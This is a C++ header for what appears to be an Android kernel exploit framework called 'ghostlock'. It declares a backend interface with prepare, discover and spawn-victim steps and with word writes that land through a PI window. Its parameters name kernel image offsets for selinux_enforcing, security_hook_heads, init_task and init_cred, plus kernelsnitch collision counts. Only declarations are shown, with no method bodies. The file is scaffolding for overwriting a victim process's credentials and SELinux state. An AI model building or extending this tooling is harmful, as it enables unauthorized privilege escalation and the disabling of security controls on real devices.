#pragma once
/** @file jni/api_43499.hpp
 *  43499 的函数面：一个库、一组具名函数、参数类型化（用户裁定 2026-10-14，取代帧协议）。
 *
 *  本文件是**类型的唯一权威**：落字形状（WriteForm 与它的后端映射）、设备侧发布的事实
 *  （Facts43499）、以及设备工作的缝（Ops43499Seams）都定义在这里。旧的分帧实现（ops_43499.hpp/.cpp）
 *  在这批里仍然存在并引用同一批类型，等 Kotlin 侧切到函数面之后整块删除，届时不会有两份定义。
 *
 *  与本类打交道的方式就是调用它的具名函数：参数是数字/跨度，结果是调用码加输出参数；失败时
 *  refusal() 给出**名字**（例如 not-ready:prepare）。没有 op 名、没有 token、没有字节帧。
 */
#include <cstdint>
#include <string_view>
#include <span>

#include "jni/backend_api.hpp"

namespace ghostlock::jni {
    /**
     *  一次 43499 字写取哪种落字形状。
     *
     *  是封闭集合，因为落字形状不能从 (地址, 值) 推出来：W1 与 W3 都写零，差别只在"目标里原有的字节
     *  是否保留"。到后端自己的 (mode, preserve) 映射就在这旁边，别处没有第二份。
     */
    enum class WriteForm : std::uint64_t {
        ClearPreserving = 1, /**< W1：清字段，保留目标原有内容。 */
        ClearLeaf = 2,       /**< W3：走叶子臂清字段（不保留）。 */
        ValuePreserving = 3, /**< W2：写一个值，保留目标原有内容。 */
        Count = 4,
    };

    [[nodiscard]] constexpr const char *write_form_name(WriteForm form) noexcept {
        switch (form) {
            case WriteForm::ClearPreserving: return "clear-preserving";
            case WriteForm::ClearLeaf: return "clear-leaf";
            case WriteForm::ValuePreserving: return "value-preserving";
            case WriteForm::Count: break;
        }
        return "unknown";
    }

    [[nodiscard]] constexpr WriteForm write_form_of(std::uint64_t raw) noexcept {
        return raw >= 1U && raw < static_cast<std::uint64_t>(WriteForm::Count)
                   ? static_cast<WriteForm>(raw)
                   : WriteForm::Count;
    }

    /** 后端自己的落字形状：内存层叫 mode 的那个值，加上 preserve。 */
    struct FormMapping final {
        std::int32_t mode; /**< 0 禁用、1 清零、2 凭据（memory::WriteMode）。 */
        bool preserve;     /**< 目标原有字节是否保留。 */
    };

    [[nodiscard]] constexpr FormMapping map_write_form(WriteForm form) noexcept {
        switch (form) {
            case WriteForm::ClearPreserving: return FormMapping{1, true};
            case WriteForm::ClearLeaf: return FormMapping{1, false};
            case WriteForm::ValuePreserving: return FormMapping{2, true};
            case WriteForm::Count: break;
        }
        return FormMapping{0, false};
    }

    /** 设备侧为这个会话发布的事实。零表示"还不知道"。 */
    struct Facts43499 final {
        std::uint64_t page_base = 0U;
        std::uint64_t word0 = 0U;
        std::uint64_t word1 = 0U;
        std::uint64_t payload_page = 0U;
        std::uint64_t payload_base = 0U;
        std::uint64_t alias_delta = 0U;
        std::uint64_t found = 0U;
        std::uint64_t mm_struct = 0U;
        std::uint64_t victim_task = 0U;
        std::uint64_t victim_pid = 0U;
        bool prepared = false;
        bool discovered = false;
        bool victim_spawned = false;

        /** @return 可以写字时 nullptr，否则是第一个缺失事实的名字。 */
        [[nodiscard]] const char *ready_for_write() const noexcept {
            if (!prepared || page_base == 0U) {
                return "not-ready:prepare";
            }
            if (!discovered || found == 0U) {
                return "not-ready:discover";
            }
            if (!victim_spawned || victim_task == 0U) {
                return "not-ready:victim";
            }
            return nullptr;
        }
    };

    /** Snapshot 为这个 backend 的事实发布的能力位。 */
    inline constexpr std::uint64_t kFactPrepared = 1U << 16U;
    inline constexpr std::uint64_t kFactDiscovered = 1U << 17U;
    inline constexpr std::uint64_t kFactVictim = 1U << 18U;
    /** 这个 backend 一次写的宽度。 */
    inline constexpr std::uint64_t k43499Width = 8U;
    /** Snapshot 的能力位：PI 窗口。 */
    inline constexpr std::uint64_t kCapPiWindow = 1U << 0U;

    /** 设备工作，用函数指针给。给空的缝，它的函数就以 op-not-wired:<名字> 具名拒绝。 */
    struct Ops43499Seams final {
        /** 跑准备，并填它产生的事实。 */
        bool (*prepare)(Facts43499 &facts, void *context) noexcept = nullptr;
        /** 跑搜索，并填它找到的东西。 */
        bool (*discover)(Facts43499 &facts, void *context) noexcept = nullptr;
        /** fork 出受害者，并读回它的 task 地址。 */
        bool (*spawn_victim)(Facts43499 &facts, void *context) noexcept = nullptr;
        /** 问受害者它是什么：kind 0 = uid，1 = comm。 */
        bool (*victim_probe)(std::uint64_t kind, std::uint64_t &value, void *context) noexcept = nullptr;
        /** 通过窗口落一个字：一次尝试，整个事务。 */
        bool (*land)(std::uint64_t address, std::uint64_t value, WriteForm form, std::uint64_t offset,
                     void *context) noexcept = nullptr;
        /** 当路由能读时，读回一个字。 */
        bool (*read)(std::uint64_t address, std::uint64_t &value, void *context) noexcept = nullptr;
        void *context = nullptr;
    };

    /**
     *  初始化参数：**类型化字段**，不是一帧字节。
     *
     *  这些值来自 profile（路由几何、kernelsnitch 碰撞数、凭据镜像基址等）。给不全就由
     *  initialize 以 bad-parameters:<字段名> 指名拒绝。
     */
    struct Initialize43499 final {
        std::uint64_t route_id = 0U;
        std::uint64_t waiter_off = 0U;
        std::uint64_t buffer_size = 0U;
        std::uint64_t task_offset = 0U;
        std::uint64_t lock_offset = 0U;
        std::uint64_t kernelsnitch_collisions = 0U;
        std::uint64_t mm_struct_sz = 0U;
        std::uint64_t compact_waiter = 0U;
        std::uint64_t copy_size = 0U;
        std::uint64_t usage_value = 0U;
        std::uint64_t caps_count = 0U;
        std::uint64_t caps_value = 0U;
        std::uint64_t ref0_image = 0U;
        std::uint64_t ref1_image = 0U;
        std::uint64_t ref2_image = 0U;
        std::uint64_t ref3_image = 0U;
        /** 画像给这一台机器的镜像偏移（运行期基址要由发现步骤补）。 */
        std::uint64_t image_selinux_enforcing = 0U;
        std::uint64_t image_security_hook_heads = 0U;
        std::uint64_t image_init_task = 0U;
        std::uint64_t image_init_cred = 0U;
    };

    /** Snapshot 的结果（值 + 事实），一个结构体交给调用方。 */
    struct Snapshot43499 final {
        std::uint64_t phase = 0U;
        std::uint64_t flags = kCapPiWindow;
        std::uint64_t width = k43499Width;
        Facts43499 facts{};
    };

    /** write_word 的请求（类型化字段）。 */
    struct WriteWord43499 final {
        std::uint64_t address = 0U;
        std::uint64_t value = 0U;
        WriteForm form = WriteForm::ClearPreserving;
        std::uint64_t offset = 0U;
        /** 值是不是调用方给的（clear 形状不接受非零值）。 */
        bool value_given = false;
    };

    /**
     *  43499 的会话：一个对象一份状态，函数就是它的方法。
     *
     *  线程安全：本类自己不带锁 —— 会话句柄的互斥由 JNI 层（一个句柄一把锁）负责，因为"同一句柄
     *  不许并发"这条规则的边界在那里。
     */
    class Backend43499 final {
      public:
        Backend43499() noexcept = default;
        explicit Backend43499(Ops43499Seams seams) noexcept : seams_(seams) {}

        /** 带参数初始化。@return Ok，或 bad-parameters:<字段名>。 */
        [[nodiscard]] CallCode initialize(const Initialize43499 &params) noexcept;

        [[nodiscard]] CallCode shutdown() noexcept;

        /** 回答这个会话现在是什么样（相位 + 能力位 + 事实）。 */
        [[nodiscard]] CallCode snapshot(Snapshot43499 &out) noexcept;

        /** 跑准备（设备缝）。 */
        [[nodiscard]] CallCode prepare(Snapshot43499 &out) noexcept;

        /** 跑搜索（设备缝）。 */
        [[nodiscard]] CallCode discover(Snapshot43499 &out) noexcept;

        /** fork 受害者（设备缝）。 */
        [[nodiscard]] CallCode spawn_victim(Snapshot43499 &out) noexcept;

        /** 问受害者（kind 0 = uid，1 = comm）。 */
        [[nodiscard]] CallCode victim_probe(std::uint64_t kind, std::uint64_t &value) noexcept;

        /** 落一个字。 */
        [[nodiscard]] CallCode write_word(const WriteWord43499 &request) noexcept;

        /** 读一个字（路由不能读时是 Unsupported，不是失败）。 */
        [[nodiscard]] CallCode read_word(std::uint64_t address, std::uint64_t &value) noexcept;

        [[nodiscard]] const Facts43499 &facts() const noexcept { return facts_; }

        [[nodiscard]] api::Phase phase() const noexcept { return phase_; }

        [[nodiscard]] const char *refusal() const noexcept { return refusal_.c_str(); }

      private:
        /** 会话关掉之后，除 snapshot / shutdown / destroy 之外的调用一律具名拒绝。 */
        [[nodiscard]] CallCode closed_guard() noexcept;

        /** 把事实发布进 Snapshot 的能力位。 */
        void publish(Snapshot43499 &out) const noexcept;

        Ops43499Seams seams_{};
        Facts43499 facts_{};
        Initialize43499 params_{};
        Refusal refusal_{};
        api::Phase phase_ = api::Phase::Declared;
        bool initialized_ = false;
    };
}  // namespace ghostlock::jni
